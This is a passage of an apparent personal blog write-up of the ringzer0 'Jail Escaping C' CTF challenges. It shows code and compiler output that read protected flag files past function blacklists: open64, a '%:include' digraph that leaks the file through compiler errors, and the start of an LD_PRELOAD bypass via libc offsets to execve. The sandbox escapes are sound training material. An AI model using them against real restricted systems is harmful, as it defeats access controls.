@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="keywords" content="ringzer0, ctf, wargames, c">
+        <meta name="description" content="Here are my solutions for the ringzer0 Jail Escaping C challenges: Level 1: https://ringzer0team.com/challenges/228 Level 2: https://ringzer0team.com/challenges/229 Level 3: https://ringzer0team.com/challenges/230 Level 1 level1@ringzer0team.com's password: Last login: Sun Apr 24 05:48:42 2016 from RingZer0 ...">
+        <title>ringzer0 CTF - Jail Escaping C - blog.dornea.nu</title>
+        <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+        <link rel="stylesheet" href="/css/ipython.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/bootstrap.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/font-icons/style.min.css" type="text/css" />
+        <link rel="stylesheet" href="http://blog.dornea.nu/theme/css/niu2.min.css" type="text/css" />
+        <link rel="stylesheet" href="/css/custom.css" type="text/css" />
+		
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/jquery-1.11.0.min.js"></script>
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/niu2.min.js"></script>
+        <script type="text/javascript" src="http://blog.dornea.nu/theme/js/bootstrap.min.js"></script>
+        
+        <link rel="canonical" href="http://blog.dornea.nu/2016/09/19/ringzer0-ctf-jail-escaping-c" />
+        <script type="text/javascript">window.onload=function(){};</script>
+        <!--[if lt IE 9]>
+            <script src="http://blog.dornea.nu/theme/js/html5shiv.js"></script>
+            <script src="http://blog.dornea.nu/theme/js/respond.min.js"></script>
+        <![endif]-->
+    </head>
+    <body> 
+        <div id="body-header">
+            <div class="navbar navbar-inverse navbar-fixed-top">
+                <div class="col-md-12">
+                    <div class="navbar-header">
+                        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </button>
+                        <a class="navbar-brand" href="http://blog.dornea.nu">
+                            <i class="icon-home"></i>blog.dornea.nu
+                        </a>
+                    </div>
+                    <nav class="collapse navbar-collapse bs-navbar-collapse" role="navigation">
+                        <ul class="nav navbar-nav">
+                            <li><a href="http://dornea.nu" title="about">
+                                <i class="icon-user"></i>about</a>
+                            </li>
+                            <li><a href="/archives.html" title="archives">
+                                <i class="icon-archive"></i>archives</a>
+                            </li>
+                            <li><a href="/tags.html" title="tags">
+                                <i class="icon-tag"></i>tags</a>
+                            </li>
+                            <li><a href="/feeds/rss.xml" title="feeds">
+                                <i class="icon-rss"></i>feeds</a>
+                            </li>
+                        <!-- category dropdown list -->
+                        <li class="dropdown">
+                           <a href="#" class="dropdown-toggle" data-toggle="dropdown">
+                                <i class="icon-folder-open"></i>category<b class="caret"></b>
+                           </a>
+                           <ul class="dropdown-menu">
+                               <li><a href="http://blog.dornea.nu/category/blog">
+                                      <i class="icon-pencil"></i>blog
+                                      (110)</a></li>
+                               <li><a href="http://blog.dornea.nu/category/low">
+                                   <i class="icon-folder-close"></i>LOW
+                                      (27)</a></li>
+                               <li><a href="http://blog.dornea.nu/category/notes">
+                                      <i class="icon-book"></i>notes
+                                      (21)</a></li>
+                           </ul>
+                        </li>
+                        <!--  self defined dropdown list -->
+                        </ul>
+                        
+                        <!-- right nav bar -->
+                        <ul class="nav navbar-nav navbar-right">
+                        <!-- google custom search -->
+                        <li>
+                        <div id="niu2-cse-wrapper">
+                            <div id="niu2-cse-header-box" class="navbar-form navbar-nav">
+                                <form action="http://google.com/cse">
+                                    <input type="hidden" name="cx" value="008508447409818574933:pxyxuhrgnxi" />
+                                    <input type="hidden" name="ie" value="UTF-8" />
+                                    <div class="form-group">
+                                        <input id="niu2-cse-search-input" class="niu2-cse-header form-control" 
+                                            type="text" name="q" 
+                                            placeholder="Press enter to search ..."/>
+                                    </div>
+                                </form>
+                           </div>
+                           <div id="niu2-cse-ctrl-box" class="navbar-nav">
+                            <i id="niu2-cse-search-image" class="icon-search navbar-nav"></i><span id="niu2-cse-search-text">Search</span>
+                           </div>
+                       </div>
+                       </li>
+                       </ul>
+                    </nav>
+                </div>
+            </div>
+<style>
+    #banner{
+        background-image:url("http://blog.dornea.nu//images/header.jpg");
+    }   
+</style>
+
+<div id="banner">
+    <div class="container">
+        <div class="copy">
+            <h2>blog.dornea.nu</h2>
+                <p class="intro">Hack, code and drink some țuică. Personal blog of Victor Dorneanu.</p>
+        </div>
+    </div>
+</div>
+            <!-- End Banner -->
+        </div>
+
+        <div id="body-content">
+            <div class="col-md-8 col-md-offset-2">
+                <h1 id="content-heading">ringzer0 CTF - Jail Escaping C</h1>
+            </div>
+            <div id="niu2-left-container" class="col-md-6 col-md-offset-2 with-right-border">
+                <div id="niu2-main-content">
+                    <p>Here are my solutions for the <a href="https://ringzer0team.com">ringzer0</a> <strong>Jail Escaping C</strong> challenges:</p>
+<ul>
+<li>Level 1: https://ringzer0team.com/challenges/228</li>
+<li>Level 2: https://ringzer0team.com/challenges/229</li>
+<li>Level 3: https://ringzer0team.com/challenges/230</li>
+</ul>
+<h1 id="5afaf1679ad0887adebaddb40e0bd3f7">Level 1</h1>
+<div class="highlight"><pre>level1@ringzer0team.com<span class="s1">'s password: </span>
+<span class="s1">Last login: Sun Apr 24 05:48:42 2016 from</span>
+
+<span class="s1">RingZer0 Team Online CTF</span>
+
+<span class="s1">C Jail Level 1:</span>
+<span class="s1">Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)</span>
+
+<span class="s1">Flag is located at /home/level1/flag.txt</span>
+
+<span class="s1">Challenge instruction:</span>
+<span class="s1">-----------------------------</span>
+
+<span class="s1">Type DONE to compile and execute your binary.</span>
+
+
+<span class="s1">Your payload will be compiled that way:</span>
+<span class="s1">gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin</span>
+
+<span class="s1">Your payload will be executed that way:</span>
+<span class="s1">LD_PRELOAD=./override.so ./bin</span>
+
+<span class="s1">You only control the content of a function.</span>
+
+<span class="s1">Here'</span>s the default includes
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;string.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt;</span>
+<span class="c">#include &lt;unistd.h&gt;</span>
+<span class="c">#include &lt;fcntl.h&gt;</span>
+<span class="c">#include &lt;sys/types.h&gt;</span>
+<span class="c">#include &lt;sys/stat.h&gt;</span>
+
+You CANNOT use the <span class="s2">"asm"</span> keyword
+
+-----------------------------
+Your C code:
+</pre></div>
+<p>So obviously I have to write some C code to read the content of <code>/home/level1/flag.txt</code>. <code>fopen</code>/<code>fread</code> are not allowed so let's do it using <code>open</code>/<code>read</code>:</p>
+<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="cp">#include &lt;fcntl.h&gt;</span>
+<span class="cp">#include &lt;sys/types.h&gt;</span>
+<span class="cp">#include &lt;sys/stat.h&gt;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span> <span class="o">=</span> <span class="s">"flag.txt"</span><span class="p">;</span>
+    <span class="kt">ssize_t</span> <span class="n">ret_in</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="c1">// Open file </span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"hello"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Read content</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">ret_in</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// Print buffer</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Flag: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="p">}</span>
+</pre></div>
+<p>Keep in mind that you'll have to paste only the contents of <code>main()</code>:</p>
+<div class="highlight"><pre><span class="o">----------------------------</span>
+<span class="n">Your</span> <span class="n">C</span> <span class="nl">code</span><span class="p">:</span>
+  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span> <span class="o">=</span> <span class="s">"flag.txt"</span><span class="p">;</span>
+    <span class="kt">ssize_t</span> <span class="n">ret_in</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="c1">// Open file </span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"hello"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Read content</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">ret_in</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="c1">// Print buffer</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Flag: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">DONE</span>
+
+<span class="o">-----------------------------</span>
+<span class="n">Compiling</span> <span class="n">your</span> <span class="n">code</span><span class="p">.</span>
+<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ec5378ac</span><span class="o">-</span><span class="mf">32f</span><span class="n">b</span><span class="o">-</span><span class="mf">4f</span><span class="mi">92</span><span class="o">-</span><span class="n">af6c</span><span class="o">-</span><span class="mi">807569</span><span class="n">d9a8be</span><span class="o">/</span><span class="n">bin</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">_ba91abe8889543278d28244379cec68d</span><span class="err">’</span><span class="o">:</span>
+<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ec5378ac</span><span class="o">-</span><span class="mf">32f</span><span class="n">b</span><span class="o">-</span><span class="mf">4f</span><span class="mi">92</span><span class="o">-</span><span class="n">af6c</span><span class="o">-</span><span class="mi">807569</span><span class="n">d9a8be</span><span class="o">/</span><span class="n">bin</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">27</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="err">‘</span><span class="k">return</span><span class="err">’</span> <span class="n">with</span> <span class="n">a</span> <span class="n">value</span><span class="p">,</span> <span class="n">in</span> <span class="n">function</span> <span class="n">returning</span> <span class="kt">void</span> <span class="p">[</span><span class="n">enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">]</span>
+     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+     <span class="o">^</span>
+<span class="n">Executing</span> <span class="n">your</span> <span class="n">code</span><span class="p">.</span>
+<span class="nl">Flag</span><span class="p">:</span> <span class="n">FLAG</span><span class="o">-</span><span class="n">ql3mI2Z8fGq56kK5QdwK8oMxgWwvji8R</span>
+</pre></div>
+<h1 id="228e9da47384bacde793a2b78d488bb0">Level 2</h1>
+<div class="highlight"><pre><span class="n">RingZer0</span> <span class="n">Team</span> <span class="n">Online</span> <span class="n">CTF</span>
+
+<span class="n">C</span> <span class="n">Jail</span> <span class="n">Level</span> <span class="mi">2</span><span class="o">:</span>
+<span class="n">Current</span> <span class="n">user</span> <span class="n">is</span> <span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span>
+
+<span class="n">Flag</span> <span class="n">is</span> <span class="n">located</span> <span class="n">at</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">level2</span><span class="o">/</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
+
+<span class="n">Challenge</span> <span class="nl">instruction</span><span class="p">:</span>
+<span class="o">-----------------------------</span>
+
+<span class="n">Type</span> <span class="n">DONE</span> <span class="n">to</span> <span class="n">compile</span> <span class="n">and</span> <span class="n">execute</span> <span class="n">your</span> <span class="n">binary</span><span class="p">.</span>
+
+
+<span class="n">Your</span> <span class="n">payload</span> <span class="n">will</span> <span class="n">be</span> <span class="n">compiled</span> <span class="n">that</span> <span class="nl">way</span><span class="p">:</span>
+<span class="n">gcc</span> <span class="o">-</span><span class="n">O3</span> <span class="o">-</span><span class="n">Wall</span> <span class="o">-</span><span class="n">fstack</span><span class="o">-</span><span class="n">protector</span><span class="o">-</span><span class="n">all</span> <span class="o">-</span><span class="n">fPIE</span> <span class="n">bin</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">bin</span>
+
+<span class="n">Your</span> <span class="n">payload</span> <span class="n">will</span> <span class="n">be</span> <span class="n">executed</span> <span class="n">that</span> <span class="nl">way</span><span class="p">:</span>
+<span class="n">LD_PRELOAD</span><span class="o">=</span><span class="p">.</span><span class="o">/</span><span class="n">override</span><span class="p">.</span><span class="n">so</span> <span class="p">.</span><span class="o">/</span><span class="n">bin</span>
+
+<span class="n">You</span> <span class="n">only</span> <span class="n">control</span> <span class="n">the</span> <span class="n">content</span> <span class="n">of</span> <span class="n">a</span> <span class="n">function</span><span class="p">.</span>
+
+<span class="n">Here</span><span class="err">'</span><span class="n">s</span> <span class="n">the</span> <span class="k">default</span> <span class="n">includes</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="cp">#include &lt;fcntl.h&gt;</span>
+<span class="cp">#include &lt;sys/types.h&gt;</span>
+<span class="cp">#include &lt;sys/stat.h&gt;</span>
+
+<span class="n">You</span> <span class="n">CANNOT</span> <span class="n">use</span> <span class="n">the</span> <span class="s">"asm"</span> <span class="n">keyword</span>
+
+<span class="o">-----------------------------</span>
+<span class="n">Your</span> <span class="n">C</span> <span class="nl">code</span><span class="p">:</span>
+</pre></div>
+<p>Pretty much the same as in the first challenge. However, some functions like <code>fopen</code>, <code>open</code>, <code>fdopen</code> were not allowed. Finally I bought the hint: </p>
+<blockquote>
+<p>Is there a 64 bits wrapper for open?</p>
+</blockquote>
+<p>And of course there is <code>open64()</code>. <code>open()</code> and <code>open64()</code> use the <code>open</code> <strong>syscall</strong> internally. The main difference is that <code>open64()</code> is equivalent
+to <code>open()</code> with <em>O_LARGEFILE</em> in order to support <strong>large</strong> files in 32 bit applications. Here is my solution (shitty code, don't use in production :D):</p>
+<div class="highlight"><pre><span class="o">-----------------------------</span>
+<span class="n">Your</span> <span class="n">C</span> <span class="nl">code</span><span class="p">:</span>
+   <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open64</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="n">pread64</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"flag: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="n">DONE</span>
+
+<span class="o">-----------------------------</span>
+<span class="n">Compiling</span> <span class="n">your</span> <span class="n">code</span><span class="p">.</span>
+<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">41</span><span class="n">d5ddc3</span><span class="o">-</span><span class="mi">8</span><span class="n">d6b</span><span class="o">-</span><span class="mi">42</span><span class="n">ce</span><span class="o">-</span><span class="n">a2cf</span><span class="o">-</span><span class="mf">1026f</span><span class="n">cfe463f</span><span class="o">/</span><span class="n">bin</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="err">‘</span><span class="n">_4fa8c04676486ca36ba261f8387a2b9d</span><span class="err">’</span><span class="o">:</span>
+<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">41</span><span class="n">d5ddc3</span><span class="o">-</span><span class="mi">8</span><span class="n">d6b</span><span class="o">-</span><span class="mi">42</span><span class="n">ce</span><span class="o">-</span><span class="n">a2cf</span><span class="o">-</span><span class="mf">1026f</span><span class="n">cfe463f</span><span class="o">/</span><span class="n">bin</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">open64</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
+     <span class="n">fd</span> <span class="o">=</span> <span class="n">open64</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+     <span class="o">^</span>
+<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">41</span><span class="n">d5ddc3</span><span class="o">-</span><span class="mi">8</span><span class="n">d6b</span><span class="o">-</span><span class="mi">42</span><span class="n">ce</span><span class="o">-</span><span class="n">a2cf</span><span class="o">-</span><span class="mf">1026f</span><span class="n">cfe463f</span><span class="o">/</span><span class="n">bin</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">16</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">implicit</span> <span class="n">declaration</span> <span class="n">of</span> <span class="n">function</span> <span class="err">‘</span><span class="n">pread64</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wimplicit</span><span class="o">-</span><span class="n">function</span><span class="o">-</span><span class="n">declaration</span><span class="p">]</span>
+     <span class="n">pread64</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+     <span class="o">^</span>
+<span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="mi">41</span><span class="n">d5ddc3</span><span class="o">-</span><span class="mi">8</span><span class="n">d6b</span><span class="o">-</span><span class="mi">42</span><span class="n">ce</span><span class="o">-</span><span class="n">a2cf</span><span class="o">-</span><span class="mf">1026f</span><span class="n">cfe463f</span><span class="o">/</span><span class="n">bin</span><span class="p">.</span><span class="nl">c</span><span class="p">:</span><span class="mi">13</span><span class="o">:</span><span class="mi">11</span><span class="o">:</span> <span class="nl">warning</span><span class="p">:</span> <span class="n">unused</span> <span class="n">variable</span> <span class="err">‘</span><span class="n">fp</span><span class="err">’</span> <span class="p">[</span><span class="o">-</span><span class="n">Wunused</span><span class="o">-</span><span class="n">variable</span><span class="p">]</span>
+     <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+           <span class="o">^</span>
+<span class="n">Executing</span> <span class="n">your</span> <span class="n">code</span><span class="p">.</span>
+<span class="nl">flag</span><span class="p">:</span> <span class="n">FLAG</span><span class="o">-</span><span class="mo">0416</span><span class="n">ewrN2o058901Aqf4w9hsyH0dfqzd</span>
+</pre></div>
+<h1 id="8f60a63315c55e659b1a2dd5064ceae8">Level 3</h1>
+<div class="highlight"><pre>RingZer0 Team Online CTF
+
+C Jail Level 3:
+Current user is <span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>level3<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>level3<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>level3<span class="o">)</span>
+
+Flag is located at /home/level3/flag.txt
+
+Challenge instruction:
+-----------------------------
+
+Type DONE to compile and execute your binary.
+
+
+Your payload will be compiled that way:
+gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
+
+Your payload will be executed that way:
+<span class="nv">LD_PRELOAD</span><span class="o">=</span>./override.so ./bin
+
+You only control the content of a <span class="k">function</span>.
+
+Here<span class="err">'</span>s the default includes
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;string.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt;</span>
+<span class="c">#include &lt;unistd.h&gt;</span>
+<span class="c">#include &lt;fcntl.h&gt;</span>
+<span class="c">#include &lt;sys/types.h&gt;</span>
+<span class="c">#include &lt;sys/stat.h&gt;</span>
+
+You CANNOT use the <span class="s2">"asm,open,read,mmap,brk,sh,#,sys,\x"</span> keyword
+
+-----------------------------
+Your C code:
+</pre></div>
+<p>I must admit that although this challenge wasn't that difficult it took me way to much time to find a reasonable solution. My first ideea
+was to write <code>shellcode</code> that would read <code>flag.txt</code> and dump its content.  This is also the reason I wrote <a href="http://blog.dornea.nu/2016/08/23/testing-shellcodes/">"Testing Shellcodes"</a>. However, I've noticed that <code>\x</code> (hex code) couldn't be used as a keyword. Instead of <em>giving up</em> my 
+first idea I should have think of some way how to re-write those hex codes to sth different: <em>octal</em> values or <em>integer</em> values of <em>chars</em>. That way I would have had bypassed the <code>\x</code> restriction.</p>
+<p>First I'll try to write down my thoughts which lead to the solution. Afterwards I'll show some other cool solutions I've seen in the write-ups. </p>
+<h2 id="50563a1b29c0ffcb8d8bcbd65caab7e9">My solution</h2>
+<p>After trying hard I've decided to buy the hint:</p>
+<div class="highlight"><pre><span class="cp">#include alias for old system?</span>
+</pre></div>
+<p>Then I was looking for another <em>preprocessor</em> directives meant to <em>embed</em>/<em>include</em> code in other files. But I didn't find sth useful. Besides 
+that all preprocessor directives start with '#' which was a bad keyword. However, this assumption was wrong. </p>
+<p>Somebody told me then that I should look for an "old function" which could do the same. Functions, you say. All'right! At (https://www.gnu.org/software/libc/manual/html_node/Function-Index.html)[https://www.gnu.org/software/libc/manual/html_node/Function-Index.html] you can find all
+<em>libc</em> functions available. But I had to do some filtering:</p>
+<ul>
+<li>since the <em>open</em> and <em>read</em> keywords weren't allowed, I wasn't able to create any <em>file streams</em> (FILE <em>) or </em>file descriptors* (int fd)<ul>
+<li>that means that all functions taking a <code>FILE *</code> pointer or a file descriptor <code>int fd</code> weren't suitable</li>
+</ul>
+</li>
+<li>the <code>exec*</code> family (execl, execlp, execle, execv, execvp, execvpe) was also not a good ideea since these functions were disabled by the <code>LD_PRELOAD</code> override</li>
+<li><code>malloc</code> was also disabled by the override so no functions using malloc internally could be used</li>
+</ul>
+<p>Finally I was desperately searching for some functions but I couldn't find one. I think I was overthinking the solution way to much: I 
+was hoping to find a <em>function</em> (in the context of C code) which would then <em>include</em> <code>flag.txt</code> and try to interpret its content as valid
+C code. Since the flag file contains no valid code, the compiler will then produce some error messages which hopefully will dump the flag
+inside <code>flag.txt</code>. Unfortunately after "parsing" the libc functions index site I couldn't find anything.</p>
+<p>Finally, somebody (thx nsr @nullsecurity.net IRC channel) told that there might be a way to accomplish "#include" without using "#". The hint 
+I was after was called <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs">Digraphs/Trigraphs</a>. Especially for the C language the preprocessor
+is able to replace digraphs/trigraphs by their <a href="https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C">single-character equivalents before any other processing</a>. This way I was able to trigger the error message I was hoping for:</p>
+<div class="highlight"><pre>Your C code:
+%:include <span class="s2">"/home/level3/flag.txt"</span>
+DONE
+
+-----------------------------
+Compiling your code.
+In file included from /tmp/1b9dd64e-70af-40cf-95b5-d4ef0593247c/bin.c:13:0:
+/home/level3/flag.txt: In <span class="k">function</span> ‘_24f9c1e3682289873677f3f7f79ea8df’:
+/home/level3/flag.txt:1:1: error: ‘FLAG’ undeclared <span class="o">(</span>first use in this <span class="k">function</span><span class="o">)</span>
+ FLAG-BE79t326XS03122r5A4206tv395P64WB
+ ^
+/home/level3/flag.txt:1:1: note: each undeclared identifier is reported only once <span class="k">for</span> each <span class="k">function</span> it appears in
+/home/level3/flag.txt:1:6: error: ‘BE79t326XS03122r5A4206tv395P64WB’ undeclared <span class="o">(</span>first use in this <span class="k">function</span><span class="o">)</span>
+ FLAG-BE79t326XS03122r5A4206tv395P64WB
+      ^
+/tmp/1b9dd64e-70af-40cf-95b5-d4ef0593247c/bin.c:16:1: error: expected ‘<span class="p">;</span>’ before ‘<span class="o">}</span>’ token
+ <span class="o">}</span>
+ ^
+Your code does not compile.
+</pre></div>
+<p>There we go: <code>FLAG-BE79t326XS03122r5A4206tv395P64WB</code></p>
+<h2 id="3d723b11aa4beea6fdf62384118f0e8e">Other solutions</h2>
+<h3 id="87daabb1a19a419cbe5442713cb3dcbe">Bypass LD_PRELOAD</h3>
+<p>As I've noticed some functions (among these also <code>execve()</code>) were disabled due to the <code>LD_PRELOAD</code> override. Some <a href="https://ringzer0team.com/profile/2319">smart guy</a> managed it to find in memory the real libc functions and thus bypassing the <code>LD_PRELOAD</code> override. Using <a href="http://libcdb.com">libcdb.com</a> you can identify the exact version of the used libc version by finding out the addresses of some functions (in his case <code>puts</code> and <code>printf</code>):</p>
+<div class="highlight"><pre>Compiling your code.
+Executing your code.
+puts: 0x7ffe36166e30
+printf: 0x7ffe3614b400
+</pre></div>
+<p>After finding the exact libc version, he/she downloaded the file and had a look at it:</p>
+<div class="highlight"><pre><span class="nv">$ </span>readelf -s libc-2.19_15.so <span class="p">|</span> grep puts
+   184: 000000000006fe30   <span class="m">399</span> FUNC    GLOBAL DEFAULT   <span class="m">12</span> _IO_puts@@GLIBC_2.2.5
+   400: 000000000006fe30   <span class="m">399</span> FUNC    WEAK   DEFAULT   <span class="m">12</span> puts@@GLIBC_2.2.5      &lt;--- the one we have
+   471: 00000000000fef10  <span class="m">1031</span> FUNC    GLOBAL DEFAULT   <span class="m">12</span> putspent@@GLIBC_2.2.5      
+   644: <span class="m">0000000000100900</span>   <span class="m">555</span> FUNC    GLOBAL DEFAULT   <span class="m">12</span> putsgent@@GLIBC_2.10
+  1089: 000000000006e730   <span class="m">303</span> FUNC    WEAK   DEFAULT   <span class="m">12</span> fputs@@GLIBC_2.2.5
+  1597: 000000000006e730   <span class="m">303</span> FUNC    GLOBAL DEFAULT   <span class="m">12</span> _IO_fputs@@GLIBC_2.2.5
+  2199: 0000000000073a80    <span class="m">95</span> FUNC    GLOBAL DEFAULT   <span class="m">12</span> fputs_unlocked@@GLIBC_2.2.5
+
+<span class="nv">$ </span>greadelf -s libc-2.19_15.so <span class="p">|</span> grep execve
+   987: 00000000000c1360   <span class="m">200</span> FUNC    GLOBAL DEFAULT   <span class="m">12</span> fexecve@@GLIBC_2.2.5
+  1418: 00000000000c1330    <span class="m">34</span> FUNC    WEAK   DEFAULT   <span class="m">12</span> execve@@GLIBC_2.2.5    &lt;--- the one we want
+</pre></div>
+<p>By calculating the offset between <code>puts</code> and <code>execve</code> he/she could then build following code:</p>
+<div class="highlight"><pre><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">real_execve</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">puts</span> <span class="o">+</span> <span class="o">&lt;</span><span class="n">OFFSET</span><span class="o">&gt;</span><span class="p">;</span>
